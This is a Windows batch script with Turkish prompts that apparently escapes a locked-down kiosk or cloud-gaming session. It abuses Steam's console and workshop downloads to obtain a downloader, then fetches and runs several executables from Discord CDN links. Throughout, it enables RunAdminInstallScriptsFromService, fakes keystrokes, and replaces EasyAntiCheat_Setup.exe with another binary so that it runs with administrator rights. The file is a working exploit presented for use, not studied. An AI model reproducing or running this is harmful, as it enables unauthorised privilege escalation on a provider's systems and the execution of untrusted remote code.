@echo off
cls
B:
color f0
MKDIR "B:\Alper" >NUL 2>&1
ICACLS "B:\Alper" /grant kiosk:(OI)(CI)F /T >NUL 2>&1
ICACLS "B:\Alper" /grant Users:(OI)(CI)F /T >NUL 2>&1
%HOMEDRIVE%
CD "C:\Program Files (x86)\Steam"
START "" "steam.exe" "steam://open/console" >NUL 2>&1
ECHO download_item 304930 2250811147|clip
ECHO In the console box press CTRL + V
:checkshit:
IF EXIST "C:\Program Files (x86)\Steam\steamapps\content\app_304930\item_2250811147\files\rdl.exe" GOTO found >NUL 2>&1
GOTO checkshit
:found:
CLS
ECHO Steam unsupportedi bekleyiniz.
PING 127.0.0.1 -n 3 >NUL 2>&1
REN "C:\Program Files (x86)\Steam\steamapps\content" alper31sjsj >NUL 2>&1
SET DL="C:\Program Files (x86)\Steam\steamapps\alper31sjsj\app_304930\item_2250811147\files\rdl.exe"
B:
cd "B:\Alper"
%DL% -LJOk https://cdn.discordapp.com/attachments/741059833163153469/763423169230667816/steam.exe >NUL 2>&1
cls
%DL% -LJOk https://cdn.discordapp.com/attachments/723141418377543762/762714660260020265/NDP472-KB4054531-Web.exe
cls
%DL% -LJOk https://cdn.discordapp.com/attachments/723141418377543762/762720980937998349/enter.exe
cls
%DL% -LJOk https://cdn.discordapp.com/attachments/723141418377543762/762719737523732500/steam.exe.old
cls
%DL% -LJOk https://cdn.discordapp.com/attachments/723141418377543762/762718370717630504/Copia.exe
cls
%DL% -LJOk https://cdn.discordapp.com/attachments/723141418377543762/763002963685277696/ctrlv.exe
cls
%DL% -LJOk https://cdn.discordapp.com/attachments/761933120923893763/768045764487282708/GFNAdminUtility.exe
C:
cd/
md progrems
B:
cd "B:\Alper"
Copy GFNAdminUtility.exe "C:/progrems"
cls
TASKKILL /F /IM steam.exe >NUL 2>&1
START "" steam.exe
cd..
md retard
C:
cd "C:/program files (x86)/steam"
move steam.exe.old "B:/retard"
B:
cd/
cd retard
start "" "steam.exe.old"
cd..
cd Alper
cls
ECHO Steam acilinca bir tusa tiklayiniz
pause > nul
timeout /t 3 /nobreak > nul
start steam://open/console
timeout /t 2 /nobreak > nul
echo @RunAdminInstallScriptsFromService 1|clip
start "" "ctrlv.exe"
timeout /t 3 /nobreak > nul
start "" "enter.exe"
start steam://install/282660
timeout /t 1 /nobreak > nul
start "" "enter.exe"
timeout /t 6 /nobreak > nul
del "B:/retard/steamapps/common/EasyAntiCheat\EasyAntiCheat\EasyAntiCheat_Setup.exe"
Copia "NDP472-KB4054531-Web.exe" ""B:/retard/steamapps/common/EasyAntiCheat\EasyAntiCheat\EasyAntiCheat_Setup.exe"
start steam://run/282660
echo Save tusuna tiklayin.C: ye gidin progrems deki GFNAdminUtilityi kopyalayip aciniz.
pause
exit

